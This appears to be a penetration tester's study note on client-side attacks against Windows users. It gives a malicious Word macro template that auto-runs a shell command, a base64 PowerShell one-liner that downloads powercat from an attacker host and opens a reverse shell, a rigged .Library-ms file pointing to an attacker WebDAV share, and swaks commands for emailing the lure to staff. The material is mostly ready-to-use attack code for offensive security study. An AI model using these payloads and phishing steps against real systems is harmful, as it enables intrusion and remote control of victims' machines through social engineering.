# Client Side Attacks


## Reconnaissance

### Downloadables Analysis

If we are able to download files from the website, we can use `exiftool` to discover its metadata and gather info.

```
exiftool -a -u <DOWNLOADED_FILE>

# -a display duplicated tags
# -u display unknown tags
```

### Client Fingerprinting

Can use "Canarytokens" to generate a URL for the target to click on which will then allow us to analyse their client information used to connect to the URL.

https://canarytokens.org/generate


## Exploitation

### Embedded Malicious Microsoft Office Macros

`.docx` files require wrapper template file so macros cannot be stored in these formats - can only run, not persistent.

`.doc` is able to store macros and easier to exploit.

1. Create `.doc` file
2. \[In Microsoft Word\] View > Macros
3. Enter name, choose current document to embed into. Click create.
4. Create malicious macro in VBA. Need to use ActiveX objects to gain access to Windows platform.

Example malicious macro template:

```
Sub AutoOpen()
  MyMacro
End Sub

Sub Document_Open()
  MyMacro
End Sub

Sub MyMacro()
  Dim Str As String
  CreateObject("Wscript.Shell").Run Str
End Sub
```

*where `Str` = the command to be executed*

**Note:** string literals can only be up to 50 chars long in VBA, so need to concatenate iteratively until full string / command payload is built

Quick python script to achieve this:

```
command = "<CMD>"

n = 50

for i in range(0, len(command), n):
	print("Str = Str + " + '"' + command[i:n] + '"')
```

Can copy paste the output to build the command payload in the VBA `Str` variable.

The command payload can be, for example, base 64-ing a PowerShell two-liner to download PowerCat and reverse shell back to our machine.

```
# Let file `payload.txt` contain PowerCat download and reverse shell payload below:
# IEX(New-Object System.Net.WebClient).DownloadString('http://<ATTACKER-IP>:<ATTACKER-WEBSERVER-PORT>/powercat.ps1');powercat -c <ATTACKER-IP> -p <ATTACKER-REVSHELL-PORT> -e powershell

link@kali:~ cat payload.txt | iconv -t UTF-16LE | base64
link@kali:~ python script.py	# script.py is python code above, with `command = "powershell.exe -nop -w hidden -e <BASE64-ENCODED-OUTPUT-FROM-PREVIOUS-COMMAND>"
```


### RCE via Windows Library Files

We can create library files that connects back to a WebDAV share on our attacking machine.

We can place a malicious executable on this share.

We can deliver the library file to a target user via social engineering, convince them to download and open it and then click on the malicious executable to e.g. gain a reverse shell.

First, need to set up WebDAV share on Kali:
```
link@kali:~$ pip3 install wsgidav
link@kali:~$ mkdir /home/link/webdav
link@kali:~$ touch /home/link/webdav/test.txt	# Optional test file for testing
link@kali:~$ /home/link/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/link/webdav
```

Can verify if WebDAV share created by navigating to http://127.0.0.1 on attacker Kali machine

Example Library File `legit.Library-ms` (delete the comments and spacing)

```
<?xml version="1.0" encoding="UTF-8"?>

// Use Windows library namespace
<libraryDescription xmlns="https://schemas.microsoft.com/windows/2009/library">

	// Specifies DLL library name and index
	<name>@windows.storage.dll,-34582</name>
	
	// Can be arbitrary version
	<version>5</version>

	// Pin to Windows navigation pane? Set to true to make file look more legit
	<isLibraryPinned>true</isLibraryPinned>

	// Icon to use, must be correctly reference, e.g. use default windows folder icon:
	<iconReference>imageres.dll,-1003</iconReference>
	
	<templateInfo>
		// Columns to display in folder, below GUID is default set of columns for folders; looks more believable
		<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
	</templateInfo>

	// Search connectors used to connect to remote location
	<searchConnectorDescriptionList>
		<searchConnectorDescription>
			<isDefaultSaveLocation>true</isDefaultSaveLocation>
			<isSupported>false</isSupported>
			<simpleLocation>
				// *****[IMPORTANT] Point to attacker's WebDAV share, must have http:// before IP*****
				<url><ATTACKER_IP></url>
			</simpleLocation>
		</searchConnectorDescription>
	</searchConnectorDescriptionList>

</libraryDescription>
```

**Note:** When you open the above library file, Windows annoyingly overwrites the `<simpleLocation>` data to 'optimise' it for the client, so may not work after opened for first time. Very annoying.

Next, need to make reverse shell shortcut. On Windows machine, create a shortcut with "Location" being the reverse shell payload, such as 

```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<ATTACKER_IP>:<ATTACKER_WERBSERVER_PORT>/powercat.ps1'); powercat -c <ATTACKER_IP> -p <ATTACKER_REVSHELL_PORT> -e powershell"
```

Put the shortcut file on the WebDAV share and convince the user to click it.



## Delivery

### swaks for SMTP

```
link@kali:~$ sudo swaks -t USER1@company.com -t USER2@company.com --from SENDERUSER@company.com --attach @config.Library-ms --server <SMTP_SERVER_IP> --body @body.txt --header "Subject: <SUBJECT_HERE>" --suppress-data -ap
```